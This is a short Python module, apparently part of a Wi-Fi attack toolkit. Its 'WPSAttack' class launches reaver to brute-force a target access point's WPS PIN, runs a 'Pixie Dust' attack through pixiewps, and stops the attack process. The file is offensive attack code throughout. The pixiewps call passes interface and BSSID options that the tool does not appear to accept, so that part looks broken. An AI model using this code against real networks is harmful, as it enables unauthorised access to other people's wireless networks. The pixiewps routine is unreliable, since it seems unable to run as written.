import subprocess
import os

class WPSAttack:
    """WPS (WiFi Protected Setup) Attack Module"""
    
    def __init__(self, interface, bssid):
        self.interface = interface
        self.bssid = bssid
        self.reaver_proc = None
    
    def bruteforce_pin(self, timeout=300):
        """Bruteforce WPS PIN"""
        try:
            cmd = [
                "reaver",
                "-i", self.interface,
                "-b", self.bssid,
                "-vv",
                "-a",
                "-N",
                "-f",
                "-t", str(timeout)
            ]
            self.reaver_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return True
        except Exception as e:
            return False
    
    def pixie_dust_attack(self):
        """Pixie Dust attack (faster)"""
        try:
            cmd = [
                "pixiewps",
                "-i", self.interface,
                "-b", self.bssid
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.stdout
        except Exception as e:
            return None
    
    def stop(self):
        """Stop WPS attack"""
        if self.reaver_proc:
            self.reaver_proc.terminate()
